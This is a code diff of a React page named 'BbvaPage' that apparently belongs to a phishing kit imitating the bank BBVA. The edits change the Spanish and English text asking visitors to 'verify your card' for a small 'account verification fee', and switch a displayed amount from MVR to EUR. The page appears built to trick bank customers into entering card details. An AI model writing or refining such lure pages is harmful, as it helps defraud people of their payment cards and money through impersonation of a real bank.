@@ -1256,8 +1256,8 @@ export default function BbvaPage(props: any) {
                 </h2>
                 <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
                   {language === "es"
-                    ? "Verifique su tarjeta para continuar. Se deducirá una comisión de 0.0082 EUR."
-                    : "Verify your card to continue. An account fee of 0.0082 EUR will be deducted."}
+                    ? "Verifique su tarjeta para continuar. Se deducirá una comisión de 0.008 EUR."
+                    : "Verify your card to continue. An account fee of 0.008 EUR will be deducted."}
                 </p>
 
                 {/* Form */}
@@ -1367,7 +1367,7 @@ export default function BbvaPage(props: any) {
                       i
                     </div>
                     <p className="text-[12px] sm:text-[12.5px] text-[#334155] leading-relaxed">
-                      Please note: An account verification fee of <strong className="text-[#058998] font-bold">0.0082 EUR</strong> will be deducted to verify your card.
+                      Please note: An account verification fee of <strong className="text-[#058998] font-bold">0.008 EUR</strong> will be deducted to verify your card.
                     </p>
                   </div>
 
@@ -1475,7 +1475,7 @@ export default function BbvaPage(props: any) {
                   ΠΟΣΟ
                 </p>
                 <p className="text-[14px] font-normal text-[#000000] mt-0.5">
-                  MVR 1.04
+                  EUR 0.008
                 </p>
               </div>
 
